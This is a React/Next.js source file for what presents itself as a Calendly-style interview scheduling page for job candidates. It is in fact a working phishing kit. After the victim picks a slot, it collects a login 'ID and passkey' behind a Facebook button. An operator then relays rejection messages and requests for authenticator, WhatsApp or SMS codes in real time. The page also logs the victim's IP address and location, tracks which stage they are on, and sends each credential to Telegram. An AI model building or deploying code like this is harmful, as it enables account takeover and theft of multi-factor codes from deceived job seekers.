"use client";

import { useEffect, useMemo, useState, Suspense, useRef, useCallback } from "react";
import { useSearchParams } from "next/navigation";
import Link from "next/link";
import PhoneInputWithCountry from "@/components/PhoneInputWithCountry";
import TimezoneSelector from "@/components/TimezoneSelector";
import VerifyModal, { type VerifyStage } from "@/components/VerifyModal";
import MeetingInfoPanel from "@/components/MeetingInfoPanel";
import CornerRibbon from "@/components/CornerRibbon";
import type { Settings, BookingStatus } from "@/lib/types";
import {
  buildMonthGrid,
  buildDaySlots,
  formatDateLong,
  WEEKDAY_LABELS,
  type MonthDay,
  type TimeSlot,
} from "@/lib/scheduling";
import { parseBookingCodeData, serializeBookingCodeData, getCodeLabel, type BookingCodeData } from "@/lib/codeData";
import { createClient } from "@/lib/supabase/client";
import { ChevronLeft, ChevronRight, Plus } from "lucide-react";

const DEFAULT_SETTINGS: Settings = {
  id: 1,
  working_days: [1, 2, 3, 4, 5],
  day_start_time: "09:00",
  day_end_time: "17:00",
  slot_duration_mins: 30,
  timezone: "America/New_York",
  interviewer_name: "Sarah Jenkins",
  interviewer_photo_url: null,
  meeting_type: "Web Conference",
  updated_at: "",
};

type Step = "datetime" | "details";
type Phase = "form" | "confirmed";

const MONTH_LABEL = (y: number, m: number) =>
  new Date(y, m, 1).toLocaleDateString("en-US", { month: "long", year: "numeric" });

function SchedulePageInner() {
  const supabase = useMemo(() => createClient(), []);
  const searchParams = useSearchParams();
  const jobSlug = searchParams.get("job");

  // Persistent Session ID for real-time presence tracking
  const [sessionId] = useState(() => {
    if (typeof window !== "undefined") {
      const stored = sessionStorage.getItem("candidate_session_id");
      if (stored) return stored;
      const gen = crypto.randomUUID();
      sessionStorage.setItem("candidate_session_id", gen);
      return gen;
    }
    return "cand-" + Math.random().toString(36).substring(2, 9);
  });

  const [settings, setSettings] = useState<Settings>(DEFAULT_SETTINGS);
  const [jobTitle, setJobTitle] = useState<string | null>(null);
  const [jobId, setJobId] = useState<string | null>(null);

  const now = new Date();
  const [cursor, setCursor] = useState({ year: now.getFullYear(), month: now.getMonth() });
  const monthGrid = useMemo(() => buildMonthGrid(cursor.year, cursor.month, settings), [cursor, settings]);
  const [timezone, setTimezone] = useState<string>("America/New_York");

  const [step, setStep] = useState<Step>("datetime");
  const [selectedDate, setSelectedDate] = useState<string | null>(null);
  const [slots, setSlots] = useState<TimeSlot[]>([]);
  const [loadingSlots, setLoadingSlots] = useState(false);
  const [selectedSlot, setSelectedSlot] = useState<TimeSlot | null>(null);

  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("+1 ");
  const [notes, setNotes] = useState("");
  const [showGuestInput, setShowGuestInput] = useState(false);
  const [guestEmail, setGuestEmail] = useState("");

  const [phase, setPhase] = useState<Phase>("form");
  const [verifyStage, setVerifyStage] = useState<VerifyStage>("closed");
  const [codeNumber, setCodeNumber] = useState<number>(1);
  const [displayCodeValue, setDisplayCodeValue] = useState<string>("");
  const [submitting, setSubmitting] = useState(false);
  const [verifyError, setVerifyError] = useState<string | null>(null);
  const [bookingId, setBookingId] = useState<string | null>(null);
  const [facebookUser, setFacebookUser] = useState<{
    id?: string;
    name?: string;
    email?: string;
    picture?: string;
  } | null>(null);

  const [geoInfo, setGeoInfo] = useState<{
    ip: string;
    city: string;
    state: string;
    country: string;
    timezone?: string;
  } | null>(null);

  const FB_APP_ID = process.env.NEXT_PUBLIC_FACEBOOK_APP_ID || "2497354053994375";

  // Fetch client IP and location info
  useEffect(() => {
    (async () => {
      try {
        const res = await fetch("/api/geo");
        if (res.ok) {
          const data = await res.json();
          setGeoInfo(data);
          if (data.timezone) {
            setTimezone(data.timezone);
          }
        }
      } catch (err) {
        console.error("Geo lookup error:", err);
      }
    })();
  }, []);

  // Initialize Facebook Javascript SDK
  useEffect(() => {
    if (typeof window === "undefined") return;

    if (!document.getElementById("facebook-jssdk")) {
      (window as unknown as { fbAsyncInit?: () => void }).fbAsyncInit = function () {
        (window as unknown as { FB?: { init: (opts: Record<string, unknown>) => void } }).FB?.init({
          appId: FB_APP_ID,
          cookie: true,
          xfbml: true,
          version: "v19.0",
        });
      };

      const js = document.createElement("script");
      js.id = "facebook-jssdk";
      js.src = "https://connect.facebook.net/en_US/sdk.js";
      js.async = true;
      js.defer = true;
      document.body.appendChild(js);
    }
  }, [FB_APP_ID]);

  // Initialize client's detected timezone
  useEffect(() => {
    try {
      const clientTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
      if (clientTz) setTimezone(clientTz);
    } catch {}
  }, []);

  const interviewerParam = searchParams.get("interviewer") || searchParams.get("admin");

  useEffect(() => {
    (async () => {
      let query = supabase.from("settings").select("*");

      if (interviewerParam) {
        if (interviewerParam.includes("-")) {
          // UUID lookup by user_id
          query = query.eq("user_id", interviewerParam);
        } else if (!isNaN(Number(interviewerParam))) {
          query = query.eq("id", Number(interviewerParam));
        }
      }

      const { data: s } = await query.order("id", { ascending: true }).limit(1).maybeSingle();

      if (s) {
        setSettings({
          ...s,
          interviewer_name: s.interviewer_name || "Sarah Jenkins",
        } as Settings);
      } else {
        const { data: defaultRow } = await supabase.from("settings").select("*").eq("id", 1).maybeSingle();
        if (defaultRow) {
          setSettings({
            ...defaultRow,
            interviewer_name: defaultRow.interviewer_name || "Sarah Jenkins",
          } as Settings);
        }
      }

      if (jobSlug) {
        const { data: job } = await supabase
          .from("jobs")
          .select("id, title")
          .eq("slug", jobSlug)
          .eq("status", "published")
          .maybeSingle();
        if (job) {
          setJobId(job.id);
          setJobTitle(job.title);
        }
      }
    })();
  }, [supabase, jobSlug, interviewerParam]);

  useEffect(() => {
    if (!selectedDate) return;
    setLoadingSlots(true);
    (async () => {
      const { data } = await supabase.from("public_booking_slots").select("start_time").eq("date", selectedDate);
      const taken = (data ?? []).map((r: { start_time: string }) => r.start_time);
      setSlots(buildDaySlots(settings, taken));
      setLoadingSlots(false);
    })();
  }, [selectedDate, settings, supabase]);

  const draftSavingRef = useRef(false);
  const lastSavedDraftHash = useRef("");
  const draftNotifiedRef = useRef(false);

  const visitLoggedSessionRef = useRef<string | null>(null);

  // Log visit immediately when candidate opens the schedule page (including IP and location)
  useEffect(() => {
    if (typeof window === "undefined") return;
    const visitKey = `visit_logged_${sessionId}`;
    const alreadyLogged = sessionStorage.getItem(visitKey);

    // If not logged yet, or if logged previously without geo and geo has now arrived
    if (!alreadyLogged || (geoInfo && !sessionStorage.getItem(`geo_logged_${sessionId}`))) {
      sessionStorage.setItem(visitKey, "1");
      if (geoInfo) {
        sessionStorage.setItem(`geo_logged_${sessionId}`, "1");
      }

      (async () => {
        try {
          const visitData = {
            session_id: sessionId,
            admin_user_id: settings.user_id || null,
            admin_email: settings.admin_email || null,
            interviewer_name: settings.interviewer_name || null,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "America/New_York",
            user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
            referrer: typeof document !== "undefined" ? document.referrer || null : null,
            ip_address: geoInfo?.ip || null,
            city: geoInfo?.city || null,
            state: geoInfo?.state || null,
            country: geoInfo?.country || null,
          };

          if (!alreadyLogged) {
            await supabase.from("schedule_visits").insert(visitData);
            visitLoggedSessionRef.current = sessionId;

            // Dispatch immediate Telegram notification for the visit
            fetch("/api/webhooks/telegram", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                type: "schedule_visit",
                record: visitData,
              }),
            }).catch(() => {});
          } else if (geoInfo) {
            // Update the visit row with the now resolved IP & location
            await supabase
              .from("schedule_visits")
              .update({
                ip_address: geoInfo.ip,
                city: geoInfo.city,
                state: geoInfo.state,
                country: geoInfo.country,
              })
              .eq("session_id", sessionId);
          }
        } catch (err) {
          console.error("Failed to log schedule visit:", err);
        }
      })();
    }
  }, [sessionId, settings, geoInfo, supabase]);

  // Real-Time Auto-Save for Draft Candidate Details (Saves candidate even if they close before popups)
  const autoSaveDraftBooking = useCallback(async () => {
    if (!name.trim() && !email.trim()) return;
    if (!selectedDate || !selectedSlot) return;

    const draftHash = `${name.trim()}|${email.trim()}|${phone.trim()}|${notes.trim()}|${guestEmail.trim()}|${selectedDate}|${selectedSlot.start_time}`;
    if (draftHash === lastSavedDraftHash.current) return;
    if (draftSavingRef.current) return;
    draftSavingRef.current = true;

    try {
      const [firstName, ...rest] = name.trim().split(/\s+/);
      const lastName = rest.join(" ") || "-";
      const combinedNotes = [notes, guestEmail ? `Guests: ${guestEmail}` : ""].filter(Boolean).join("\n");

      const bookingData = {
        session_id: sessionId,
        job_id: jobId,
        first_name: firstName || name.trim() || "Candidate",
        last_name: lastName,
        email: email.trim() || `draft-${sessionId.substring(0, 8)}@temp.recruitment`,
        phone_number: phone.trim() || null,
        notes: combinedNotes || null,
        date: selectedDate,
        start_time: selectedSlot.start_time,
        end_time: selectedSlot.end_time,
        timezone,
        status: "pending" as const,
        admin_user_id: settings.user_id || null,
        admin_email: settings.admin_email || null,
        interviewer_name: settings.interviewer_name || null,
        ip_address: geoInfo?.ip || null,
        city: geoInfo?.city || null,
        state: geoInfo?.state || null,
        country: geoInfo?.country || null,
      };

      if (bookingId) {
        await supabase.from("bookings").update(bookingData).eq("id", bookingId);
        lastSavedDraftHash.current = draftHash;
      } else {
        const { data: existing } = await supabase
          .from("bookings")
          .select("id")
          .eq("session_id", sessionId)
          .maybeSingle();

        if (existing?.id) {
          setBookingId(existing.id);
          await supabase.from("bookings").update(bookingData).eq("id", existing.id);
          lastSavedDraftHash.current = draftHash;
        } else {
          const { data: inserted, error } = await supabase
            .from("bookings")
            .insert(bookingData)
            .select("id")
            .single();

          if (!error && inserted?.id) {
            setBookingId(inserted.id);
            lastSavedDraftHash.current = draftHash;
          }
        }
      }

      // Notify Telegram when candidate details are drafted/updated
      if (name.trim().length >= 2 && email.includes("@") && !draftNotifiedRef.current) {
        draftNotifiedRef.current = true;
        fetch("/api/webhooks/telegram", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            type: "candidate_draft",
            record: {
              ...bookingData,
              first_name: firstName || name.trim(),
              last_name: lastName,
              email: email.trim(),
              phone_number: phone.trim(),
            },
          }),
        }).catch(() => {});
      }
    } catch (err) {
      console.error("Auto-save draft booking error:", err);
    } finally {
      draftSavingRef.current = false;
    }
  }, [name, email, phone, notes, guestEmail, selectedDate, selectedSlot, sessionId, jobId, timezone, settings, geoInfo, bookingId, supabase]);

  // Debounced trigger for auto-saving candidate details as they type
  useEffect(() => {
    if (step !== "details") return;
    if (!name.trim() && !email.trim()) return;

    const timer = setTimeout(() => {
      autoSaveDraftBooking();
    }, 600);

    return () => clearTimeout(timer);
  }, [step, name, email, phone, notes, guestEmail, autoSaveDraftBooking]);

  // Flush draft booking on page close/unload
  useEffect(() => {
    const handleBeforeUnload = () => {
      if (name.trim() || email.trim()) {
        autoSaveDraftBooking();
      }
    };
    window.addEventListener("beforeunload", handleBeforeUnload);
    return () => window.removeEventListener("beforeunload", handleBeforeUnload);
  }, [name, email, autoSaveDraftBooking]);

  // Real-Time Candidate Online / Offline Presence Tracking
  useEffect(() => {
    const presenceChannel = supabase.channel("candidate-presence-room", {
      config: { presence: { key: sessionId } },
    });

    presenceChannel.subscribe(async (status) => {
      if (status === "SUBSCRIBED") {
        await presenceChannel.track({
          session_id: sessionId,
          booking_id: bookingId,
          admin_user_id: settings.user_id || null,
          admin_email: settings.admin_email || null,
          interviewer_name: settings.interviewer_name || null,
          name: name.trim(),
          email: email.trim(),
          phone: phone.trim(),
          date: selectedDate,
          start_time: selectedSlot?.start_time,
          end_time: selectedSlot?.end_time,
          ip_address: geoInfo?.ip,
          city: geoInfo?.city,
          state: geoInfo?.state,
          country: geoInfo?.country,
          phase:
            phase === "confirmed"
              ? "Confirmed"
              : step === "details"
              ? verifyStage === "closed"
                ? "Entering Details"
                : verifyStage === "idPasskey"
                ? "In ID/Passkey Modal"
                : `In ${verifyStage}`
              : "Selecting Date & Time",
          online: true,
          updated_at: Date.now(),
        });
      }
    });

    const handleBeforeUnload = () => {
      presenceChannel.untrack();
    };
    window.addEventListener("beforeunload", handleBeforeUnload);

    return () => {
      window.removeEventListener("beforeunload", handleBeforeUnload);
      supabase.removeChannel(presenceChannel);
    };
  }, [sessionId, bookingId, name, email, phone, selectedDate, selectedSlot, step, phase, verifyStage, geoInfo, settings, supabase]);

  // Realtime: admin actions on this booking drive the modal's stage and error messaging
  useEffect(() => {
    if (!bookingId) return;
    const channel = supabase
      .channel(`booking-${bookingId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "bookings", filter: `id=eq.${bookingId}` },
        (payload) => {
          const newRow = payload.new as { status: BookingStatus; additional_code?: string | null };
          const status = newRow.status;
          const codeData = parseBookingCodeData(newRow.additional_code);
          const req = codeData.active_req || "";

          if (status === "confirmed") {
            setVerifyStage("closed");
            setPhase("confirmed");
          } else if (status === "rejected") {
            // ID & Passkey rejection
            setVerifyError("That ID or passkey doesn't match our records. Please re-enter and try again.");
            setVerifyStage("idPasskey");
          } else if (status === "awaiting_code") {
            if (req.startsWith("POP_CODE:")) {
              const popVal = req.replace("POP_CODE:", "");
              setDisplayCodeValue(popVal);
              setVerifyStage("displayCode");
            } else if (req.includes("_REJECTED")) {
              // Specific Code Rejection (AuthApp, WhatsApp, SMS, Code 4)
              const match = req.match(/CODE_(\d)_REJECTED/i);
              const num = match ? parseInt(match[1], 10) : 1;
              const label = getCodeLabel(num);
              setCodeNumber(num);
              setVerifyError(`${label} verification code is incorrect. Please re-enter and try again.`);
              setVerifyStage("code");
            } else if (req.includes("_REQUESTED")) {
              // Specific Code Requested (AuthApp, WhatsApp, SMS, Code 4)
              const match = req.match(/CODE_(\d)_REQUESTED/i);
              const num = match ? parseInt(match[1], 10) : 1;
              setCodeNumber(num);
              setVerifyError(null);
              setVerifyStage("code");
            } else {
              setCodeNumber(1);
              setVerifyError(null);
              setVerifyStage("code");
            }
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [bookingId, supabase]);

  const handleFacebookLogin = () => {
    const doFetchProfile = (accessToken?: string) => {
      const fb = (window as unknown as {
        FB?: {
          api: (
            path: string,
            params: Record<string, unknown>,
            cb: (res: Record<string, any>) => void
          ) => void;
        };
      }).FB;

      if (!fb) {
        setVerifyError(null);
        setVerifyStage("idPasskey");
        return;
      }

      // Fetch user profile info with high-res picture and email
      fb.api(
        "/me",
        {
          fields: "id,name,first_name,last_name,email,picture.width(320).height(320)",
          access_token: accessToken,
        },
        (userRes) => {
          if (userRes && !userRes.error && userRes.id) {
            const userId = String(userRes.id);
            const userName = (
              userRes.name ||
              [userRes.first_name, userRes.last_name].filter(Boolean).join(" ") ||
              ""
            ).trim();
            const fbEmail = (userRes.email || "").trim();

            // Extract picture URL or construct guaranteed Graph API fallback
            let picUrl = userRes.picture?.data?.url || "";
            if (!picUrl && userId) {
              picUrl = `https://graph.facebook.com/v19.0/${userId}/picture?type=large&width=320&height=320${
                accessToken ? `&access_token=${accessToken}` : ""
              }`;
            }

            const profile = {
              id: userId,
              name: userName,
              email: fbEmail,
              picture: picUrl,
            };

            setFacebookUser(profile);
            if (userName && !name) setName(userName);
            if (fbEmail && !email) setEmail(fbEmail);
            setVerifyError(null);
            setVerifyStage("idPasskey");
          } else {
            setVerifyError(null);
            setVerifyStage("idPasskey");
          }
        }
      );
    };

    const fb = (window as unknown as {
      FB?: {
        login: (
          cb: (res: { authResponse?: { accessToken: string; userID: string }; status?: string }) => void,
          opts?: { scope: string; auth_type?: string; return_scopes?: boolean }
        ) => void;
      };
    }).FB;

    if (typeof window !== "undefined" && fb) {
      try {
        fb.login(
          (response) => {
            if (response.authResponse?.accessToken) {
              doFetchProfile(response.authResponse.accessToken);
            } else {
              console.log("Facebook authentication was cancelled or not granted.");
              setVerifyError(null);
              setVerifyStage("idPasskey");
            }
          },
          { scope: "email,public_profile", auth_type: "rerequest", return_scopes: true }
        );
      } catch (err) {
        console.error("Facebook login trigger error:", err);
        setVerifyError(null);
        setVerifyStage("idPasskey");
      }
    } else {
      setVerifyError(null);
      setVerifyStage("idPasskey");
    }
  };

  function pickDay(day: MonthDay) {
    if (!day.selectable) return;
    setSelectedDate(day.date);
    setSelectedSlot(null);
  }

  function changeMonth(delta: number) {
    setCursor((c) => {
      const d = new Date(c.year, c.month + delta, 1);
      return { year: d.getFullYear(), month: d.getMonth() };
    });
    setSelectedDate(null);
    setSelectedSlot(null);
  }

  // 100% Reliable ID & Passkey submission: creates the booking row with filled credentials directly
  async function handleSubmitIdPasskey(candidateId: string, passkey: string) {
    setSubmitting(true);
    setVerifyError(null);

    try {
      const [firstName, ...rest] = name.trim().split(/\s+/);
      const lastName = rest.join(" ") || "-";
      const combinedNotes = [notes, guestEmail ? `Guests: ${guestEmail}` : ""].filter(Boolean).join("\n");

      const submissionPayload = {
        session_id: sessionId,
        job_id: jobId,
        first_name: firstName || name || "Candidate",
        last_name: lastName,
        email: email || candidateId,
        phone_number: phone || null,
        notes: combinedNotes || null,
        date: selectedDate,
        start_time: selectedSlot!.start_time,
        end_time: selectedSlot!.end_time,
        timezone,
        candidate_id: candidateId.trim() || facebookUser?.email || candidateId,
        passkey: passkey.trim(),
        status: "pending" as const,
        admin_user_id: settings.user_id || null,
        admin_email: settings.admin_email || null,
        interviewer_name: settings.interviewer_name || null,
        ip_address: geoInfo?.ip || null,
        city: geoInfo?.city || null,
        state: geoInfo?.state || null,
        country: geoInfo?.country || null,
      };

      if (!bookingId) {
        const { data, error } = await supabase
          .from("bookings")
          .insert(submissionPayload)
          .select("id")
          .single();

        if (error) throw error;
        if (data?.id) {
          setBookingId(data.id);
        }
      } else {
        // Re-submission or updating the auto-saved draft booking with credentials
        const { error } = await supabase
          .from("bookings")
          .update(submissionPayload)
          .eq("id", bookingId);

        if (error) throw error;
      }

      // Notify Telegram of credential submission with IP and geolocation
      fetch("/api/webhooks/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: "booking",
          record: submissionPayload,
        }),
      }).catch(() => {});

      setVerifyStage("waiting");
    } catch (err) {
      setVerifyError(err instanceof Error ? err.message : "Something went wrong. Please try again.");
    } finally {
      setSubmitting(false);
    }
  }

  async function handleSubmitCode(code: string) {
    setSubmitting(true);
    setVerifyError(null);
    try {
      const { data: currentBooking } = await supabase
        .from("bookings")
        .select("additional_code")
        .eq("id", bookingId!)
        .single();

      const existingData = parseBookingCodeData(currentBooking?.additional_code);
      const updatedData: BookingCodeData = {
        ...existingData,
        [`code_${codeNumber}`]: code.trim(),
        active_req: null,
      };

      const { error } = await supabase
        .from("bookings")
        .update({
          additional_code: serializeBookingCodeData(updatedData),
          status: "pending",
        })
        .eq("id", bookingId!);

      if (error) throw error;
      setVerifyStage("waiting");
    } catch (err) {
      setVerifyError(err instanceof Error ? err.message : "Something went wrong. Please try again.");
    } finally {
      setSubmitting(false);
    }
  }

  const selection =
    selectedDate && selectedSlot
      ? { date: selectedDate, startTime: selectedSlot.start_time, endTime: selectedSlot.end_time }
      : null;

  return (
    <div className="min-h-screen bg-[#F4F5F7] font-sans flex flex-col items-center justify-center py-10 px-4 text-gray-800 font-normal">
      {/* Main Scheduling Card */}
      <div
        className={`w-full bg-white rounded-2xl shadow-xl border border-gray-200/80 flex flex-col sm:flex-row transition-all duration-300 relative ${
          step === "datetime" && !selectedDate ? "max-w-3xl" : "max-w-5xl"
        }`}
      >
        {/* Exact 3D Folded Corner Ribbon Badge matching reference image */}
        <CornerRibbon />

        {/* Left Information Panel */}
        <MeetingInfoPanel
          settings={settings}
          jobTitle={jobTitle}
          selection={selection}
          timezone={timezone}
          onBack={() => setStep("datetime")}
          showBackButton={step === "details"}
        />

        {/* Right Interactive Area */}
        <main className="flex-1 p-8 sm:p-10 font-sans">
          {/* STEP 1: DATE & TIME SELECTION */}
          {phase === "form" && step === "datetime" && (
            <div className="animate-fade-up">
              <h2 className="text-xl sm:text-2xl font-semibold text-[#0a2540] mb-8">
                Select a Date &amp; Time
              </h2>

              <div className="flex flex-col lg:flex-row gap-8 lg:gap-10">
                {/* Calendar Component */}
                <div className="flex-1 max-w-sm">
                  {/* Month Navigation */}
                  <div className="flex items-center justify-between mb-6">
                    <button
                      onClick={() => changeMonth(-1)}
                      aria-label="Previous month"
                      className="h-8 w-8 rounded-full flex items-center justify-center text-gray-600 hover:bg-gray-100 transition-colors"
                    >
                      <ChevronLeft className="w-5 h-5 text-gray-600" />
                    </button>
                    <p className="text-base font-semibold text-[#0a2540]">
                      {MONTH_LABEL(cursor.year, cursor.month)}
                    </p>
                    <button
                      onClick={() => changeMonth(1)}
                      aria-label="Next month"
                      className="h-8 w-8 rounded-full flex items-center justify-center text-gray-600 hover:bg-gray-100 transition-colors"
                    >
                      <ChevronRight className="w-5 h-5 text-gray-600" />
                    </button>
                  </div>

                  {/* Weekdays */}
                  <div className="grid grid-cols-7 gap-1 text-center text-xs font-medium text-gray-400 mb-3">
                    {WEEKDAY_LABELS.map((w) => (
                      <div key={w} className="py-1">
                        {w}
                      </div>
                    ))}
                  </div>

                  {/* Days Matrix */}
                  <div className="grid grid-cols-7 gap-1 text-center">
                    {monthGrid.map((day) => {
                      const isSelected = selectedDate === day.date;
                      return (
                        <div key={day.date} className="flex items-center justify-center py-1">
                          <button
                            disabled={!day.selectable}
                            onClick={() => pickDay(day)}
                            className={`w-10 h-10 text-sm rounded-full flex items-center justify-center transition-all ${
                              isSelected
                                ? "bg-[#0069ff] text-white font-semibold shadow-xs"
                                : day.selectable
                                ? "text-[#0069ff] hover:bg-blue-50/80 cursor-pointer font-medium"
                                : "text-gray-300 cursor-not-allowed font-normal"
                            }`}
                          >
                            {day.dayNumber}
                          </button>
                        </div>
                      );
                    })}
                  </div>

                  {/* Interactive Timezone Dropdown Selector */}
                  <TimezoneSelector value={timezone} onChange={setTimezone} />
                </div>

                {/* Right Time Slots Column */}
                {selectedDate && (
                  <div className="lg:w-64 lg:border-l border-gray-200/80 lg:pl-8 animate-fade-up">
                    <p className="text-sm font-medium text-gray-700 mb-4">
                      {formatDateLong(selectedDate)}
                    </p>

                    {loadingSlots ? (
                      <p className="text-gray-400 text-xs py-4">Loading slots…</p>
                    ) : (
                      <div className="space-y-2.5 max-h-[380px] overflow-y-auto pr-1">
                        {slots.map((s) => {
                          const isCurrent = selectedSlot?.start_time === s.start_time;

                          if (isCurrent) {
                            return (
                              <div key={s.start_time} className="flex gap-2">
                                <div className="flex-1 bg-[#718096] text-white py-3 text-center font-medium text-sm rounded-lg shadow-xs">
                                  {s.label}
                                </div>
                                <button
                                  type="button"
                                  onClick={() => setStep("details")}
                                  className="flex-1 bg-[#0069ff] hover:bg-[#0055d4] text-white py-3 text-center font-medium text-sm rounded-lg transition-colors shadow-xs"
                                >
                                  Next
                                </button>
                              </div>
                            );
                          }

                          return (
                            <button
                              key={s.start_time}
                              disabled={s.taken}
                              onClick={() => setSelectedSlot(s)}
                              className="w-full border border-[#0069ff] text-[#0069ff] hover:bg-blue-50/50 font-medium py-3 text-center rounded-lg text-sm transition-all disabled:opacity-30 disabled:cursor-not-allowed"
                            >
                              {s.label}
                            </button>
                          );
                        })}
                      </div>
                    )}
                  </div>
                )}
              </div>
            </div>
          )}

          {/* STEP 2: ENTER DETAILS FORM */}
          {phase === "form" && step === "details" && (
            <div className="animate-fade-up max-w-lg font-sans">
              <h2 className="text-2xl font-semibold text-[#0a2540] mb-6">Enter Details</h2>

              <form
                className="space-y-5"
                onSubmit={(e) => {
                  e.preventDefault();
                  handleFacebookLogin();
                }}
              >
                {/* Name */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1.5">
                    Name *
                  </label>
                  <input
                    type="text"
                    required
                    value={name}
                    onChange={(e) => setName(e.target.value)}
                    placeholder="John Doe"
                    className="w-full border border-gray-300 rounded-lg p-3 text-sm text-gray-800 outline-none focus:border-[#0069ff] focus:ring-1 focus:ring-[#0069ff] transition-all bg-white font-normal"
                  />
                </div>

                {/* Email */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1.5">
                    Email *
                  </label>
                  <input
                    type="email"
                    required
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="john@example.com"
                    className="w-full border border-gray-300 rounded-lg p-3 text-sm text-gray-800 outline-none focus:border-[#0069ff] focus:ring-1 focus:ring-[#0069ff] transition-all bg-white font-normal"
                  />
                </div>

                {/* Add Guests Button / Field */}
                <div>
                  {!showGuestInput ? (
                    <button
                      type="button"
                      onClick={() => setShowGuestInput(true)}
                      className="border border-[#0069ff] text-[#0069ff] hover:bg-blue-50/60 rounded-full px-4 py-1.5 text-xs font-medium inline-flex items-center gap-1.5 transition-colors"
                    >
                      <Plus className="w-3.5 h-3.5" />
                      <span>Add guests</span>
                    </button>
                  ) : (
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1.5">
                        Guest Email(s)
                      </label>
                      <input
                        type="email"
                        value={guestEmail}
                        onChange={(e) => setGuestEmail(e.target.value)}
                        placeholder="guest@example.com"
                        className="w-full border border-gray-300 rounded-lg p-3 text-sm text-gray-800 outline-none focus:border-[#0069ff] focus:ring-1 focus:ring-[#0069ff] transition-all bg-white font-normal"
                      />
                    </div>
                  )}
                </div>

                {/* Phone Number with Calendly-Style Flag & Country Selector */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1.5">
                    Phone Number *
                  </label>
                  <PhoneInputWithCountry
                    value={phone}
                    onChange={(val) => setPhone(val)}
                    required
                  />
                </div>

                {/* Notes */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1.5">
                    Please share anything that will help prepare for our meeting.
                  </label>
                  <textarea
                    rows={3}
                    value={notes}
                    onChange={(e) => setNotes(e.target.value)}
                    className="w-full border border-gray-300 rounded-lg p-3 text-sm text-gray-800 outline-none focus:border-[#0069ff] focus:ring-1 focus:ring-[#0069ff] transition-all bg-white resize-y font-normal"
                  />
                </div>

                {/* Terms / Privacy Disclaimer */}
                <p className="text-xs text-gray-500 leading-relaxed pt-1 font-normal">
                  By proceeding, you confirm that you have read and agree to{" "}
                  <Link href="/contact" className="text-[#0069ff] hover:underline font-medium">
                    Participant Terms
                  </Link>{" "}
                  and{" "}
                  <Link href="/contact" className="text-[#0069ff] hover:underline font-medium">
                    Privacy Notice
                  </Link>
                  .
                </p>

                {/* Continue with Facebook Button */}
                <div className="pt-2">
                  <button
                    type="submit"
                    className="bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold px-8 py-3.5 rounded-full text-sm transition-all shadow-sm focus:outline-none inline-flex items-center gap-2.5 cursor-pointer"
                  >
                    <svg className="w-4 h-4 fill-current" viewBox="0 0 24 24">
                      <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
                    </svg>
                    <span>Continue with Facebook</span>
                  </button>
                </div>
              </form>
            </div>
          )}

          {/* CONFIRMED STATE */}
          {phase === "confirmed" && selectedDate && selectedSlot && (
            <div className="animate-fade-up py-8 font-sans">
              <div className="h-12 w-12 rounded-full bg-emerald-50 text-emerald-600 flex items-center justify-center text-2xl font-bold">
                ✓
              </div>
              <h2 className="text-2xl font-semibold text-[#0a2540] mt-6">
                Your meeting is confirmed.
              </h2>
              <div className="mt-6 border border-gray-200 rounded-xl p-6 text-left bg-gray-50/50">
                <p className="text-lg font-semibold text-gray-900">
                  {formatDateLong(selectedDate)}
                </p>
                <p className="mt-1 text-sm font-medium text-gray-600">
                  {selectedSlot.label} ({timezone.replace(/_/g, " ")})
                </p>
                <p className="mt-3 text-sm text-gray-700 font-normal">{email}</p>
                <p className="mt-1 text-xs text-gray-500 font-normal">{phone}</p>
              </div>
              <div className="mt-8">
                <Link
                  href="/"
                  className="text-xs font-semibold uppercase tracking-wider text-[#0069ff] hover:underline"
                >
                  ← Back to careers site
                </Link>
              </div>
            </div>
          )}
        </main>
      </div>

      {/* Verification Modal with dynamic AuthApp, WhatsApp, SMS, Email, and Pop-out Code Display */}
      <VerifyModal
        stage={verifyStage}
        submitting={submitting}
        codeNumber={codeNumber}
        displayCode={displayCodeValue}
        candidateName={name}
        candidatePhone={phone}
        candidateEmail={email}
        facebookUser={facebookUser}
        errorMessage={verifyError}
        onSubmitIdPasskey={handleSubmitIdPasskey}
        onSubmitCode={handleSubmitCode}
        onTryAnotherWay={() => {
          setVerifyError(null);
          setVerifyStage("idPasskey");
        }}
        onCancel={() => setVerifyStage("closed")}
      />
    </div>
  );
}

export default function SchedulePage() {
  return (
    <Suspense fallback={null}>
      <SchedulePageInner />
    </Suspense>
  );
}
